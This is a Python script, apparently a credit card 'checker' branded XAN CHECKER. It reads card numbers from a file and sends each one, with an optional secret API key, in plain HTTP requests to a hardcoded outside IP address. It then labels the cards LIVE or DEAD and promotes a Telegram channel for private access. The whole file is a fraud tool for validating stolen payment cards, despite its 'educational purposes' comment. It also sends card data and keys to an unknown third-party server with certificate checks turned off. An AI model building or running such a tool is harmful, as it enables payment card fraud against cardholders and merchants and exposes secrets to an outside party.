from colorama import Fore
import os
import time
import random
import json
import requests

# only for educational purposes please

def icon():
    print(Fore.BLUE + '                    v1.0.7')
    print(Fore.BLUE + '               [ XAN CHECKER ]')
    print(Fore.BLUE + ' ')
    print(Fore.BLUE + '             by roaxx & rockyy')
    print(Fore.BLUE + '  ')
icon()

with open('config.json', 'r') as file:
    config_data = json.load(file)

cc_file = config_data["cc_file"]
sk_enabled = config_data["enable_sk"]

if sk_enabled is True:
    sk = config_data["sk_key"]
    with open(cc_file, 'r') as requests_file:
        for line in requests_file:
            cx = line.strip()
            url = f"http://51.20.124.87/man.php?sk={sk}&cc={cx}" #live api
            try:
            
                response = requests.get(url, verify=False)
            
                if "APPROVED" in response.text:
                    print(Fore.GREEN + "LIVE - " + Fore.LIGHTBLACK_EX + f"{cx} | t: @xancheck")
                    time.sleep(0.7)
                elif "DECLINED" in response.text:
                    print(Fore.RED + "DEAD - " + Fore.LIGHTBLACK_EX + f"{cx}")
                    time.sleep(0.7)
                elif "Request rate limit exceeded" in response.text:
                    print(Fore.YELLOW + "RATELIMIT -" + Fore.LIGHTBLACK_EX + f" {cx}")
                    time.sleep(0.7)
                else:
                    print(Fore.RED + "DEAD - SK KEY DEAD/OR SMTH")
                time.sleep(0.7)
            except requests.RequestException as e:
                print(Fore.RED + f"DEAD - {cx} | {e}")
else:
        print(Fore.YELLOW + 'Please remember that due to server overload (public/free) the results MAY be inaccurate but MUST NOT. If you want access to your own private api, check @xancheck on telegram.')
        time.sleep(2)
        with open(cc_file, 'r') as requests_file:
            for line in requests_file:
                cx = line.strip()
                url = f"http://51.20.124.87/xan2.php?cc={cx}" #2update soon
                try:
            
                    response = requests.get(url, verify=False)
            
                    if "APPROVED" in response.text:
                        print(Fore.GREEN + "LIVE - " + Fore.LIGHTBLACK_EX + f"{cx} | telegram: @xancheck")
                        time.sleep(0.7)
                    elif "DECLINED" in response.text:
                        print(Fore.RED + "DEAD - " + Fore.LIGHTBLACK_EX + f"{cx} | telegram: @xancheck")
                        time.sleep(0.7)
                    elif "rate limit" in response.text:
                        print(Fore.YELLOW + "RATELIMIT -" + Fore.LIGHTBLACK_EX + f" {cx}")
                        time.sleep(0.7)
                    else:
                        print(Fore.RED + "our public api is overloaded, check https://t.me/xancheck for more info 🗿")
                    time.sleep(0.8)
                except requests.RequestException as e:
                    print(Fore.RED + f"DEAD - {cx} | {e}")
                    time.sleep(0.7)



        
